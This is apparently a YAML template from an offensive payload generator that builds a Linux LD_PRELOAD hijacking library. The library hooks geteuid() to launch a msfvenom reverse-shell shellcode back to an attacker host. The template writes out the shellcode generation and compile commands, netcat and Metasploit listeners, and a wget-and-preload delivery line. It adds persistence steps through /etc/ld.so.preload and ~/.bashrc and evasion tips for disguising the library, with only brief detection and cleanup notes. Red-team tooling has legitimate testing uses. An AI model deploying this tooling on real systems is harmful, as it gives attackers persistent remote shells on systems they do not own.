meta:
  name: "Linux LD_PRELOAD Shared Library Hijacking (C)"
  category: "Persistence"
  description: |
    Shared library hijacking via LD_PRELOAD for persistence and privilege escalation on Linux.
    
    Features:
    - Hijacks geteuid() function calls
    - Executes shellcode when any program calls geteuid()
    - Forks child process to avoid disrupting parent
    - Works with LD_PRELOAD environment variable
    - Stealthy persistence mechanism
    
    This technique creates a malicious shared library that hooks common functions.
    When loaded via LD_PRELOAD, it executes shellcode while maintaining normal program behavior.
    Effective for persistence if added to /etc/ld.so.preload or user shell profiles.
    
    WARNING: For authorized security testing only!

  effectiveness: "medium"

  mitre:
    tactic: "TA0003 - Persistence"
    technique: "T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking"

  artifacts:
    - "Malicious shared library (.so file)"
    - "LD_PRELOAD environment variable set"
    - "/etc/ld.so.preload modification (if persistence)"
    - "~/.bashrc or ~/.zshrc modification (if user-level persistence)"
    - "Fork() calls when hooked function invoked"
    - "mprotect() calls to make memory executable"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "output_file"
    type: "string"
    description: "Output shared library filename"
    required: false
    default: "libhijack.so"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "raw_shellcode"

  # Step 2: Format shellcode as C byte array (no encryption for simplicity)
  - type: "script"
    name: "format_payload"
    script: "format_c.py"
    args:
      data: "{{ raw_shellcode }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "c_payload"

output:
  type: "template"
  template: "persistence/ld_preload.c"
  compile:
    enabled: true
    command: "gcc -Wall -fPIC -z execstack -shared -o {{ output_path }}/{{ output_file }} {{ source_file }} -ldl"
  launch_instructions: |
    C Linux LD_PRELOAD Shared Library Hijacking - Launch Instructions

    Start Listener:
    $ nc -lvnp {{ lport }}

    Or with Metasploit:
    $ msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Transfer and Execute:
    $ python3 -m http.server 80
    $ wget http://{{ lhost }}/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && LD_PRELOAD=/tmp/{{ output_file }} id

    Establish Persistence (System-Wide - Root Required):
    echo "/tmp/{{ output_file }}" > /etc/ld.so.preload

    Establish Persistence (User-Level):
    echo 'export LD_PRELOAD=/tmp/{{ output_file }}' >> ~/.bashrc && source ~/.bashrc

    Notes:
    - Hijacks geteuid() function (called by many programs: id, whoami, ls, etc.)
    - Forks child process to execute shellcode without disrupting parent
    - Reverse shell connects to {{ lhost }}:{{ lport }}
    - Works on x64 Linux systems
    - Each program execution spawns new reverse shell (very noisy!)
    - /etc/ld.so.preload requires root access for system-wide persistence
    - ~/.bashrc persistence works for current user only
    - Other hijack targets: getuid(), access(), open(), connect()

    Troubleshooting:
    - No execution: Check if LD_PRELOAD is honored (`getconf GNU_LIBC_VERSION` to verify glibc)
    - Symbol errors: Original geteuid() not being called; check logs with `dmesg | tail`
    - No persistence: Verify /etc/ld.so.preload exists and is readable by all users
    - SUID binaries ignore: LD_PRELOAD is ignored for SUID/SGID binaries (security feature)
    - SELinux blocks: Check SELinux status with `getenforce`; may need to disable or create policy
    - Multiple shells: Each command spawns shell; consider adding mutex/lock file to limit

    Cleanup:
    On target:
    rm -f /tmp/{{ output_file }}
    rm -f /etc/ld.so.preload
    sed -i '/LD_PRELOAD/d' ~/.bashrc

    Evasion Tips:

    - Use less common function names
    - Hide library in system directories (/lib/x86_64-linux-gnu/)
    - Name library like legitimate ones (libssl.so.1.1.custom)
    - Strip debug symbols: strip {{ output_file }}

    Troubleshooting:

    - No shell spawned: Check if target program calls geteuid()
    - Library not loaded: Verify LD_PRELOAD path is absolute
    - Permission denied: Ensure library is executable
    - Multiple shells: Expected behavior if persistence is enabled

    Detection:

    Defenders can detect this via:
    - Monitor /etc/ld.so.preload for changes
    - Check LD_PRELOAD in running processes
    - lsof | grep deleted (for removed but loaded libraries)
    - Audit .so files in unusual locations

    Cleanup:

    Remove persistence:
    unset LD_PRELOAD
    rm /etc/ld.so.preload
    sed -i '/LD_PRELOAD/d' ~/.bashrc

    Remove library:
    rm /tmp/{{ output_file }}
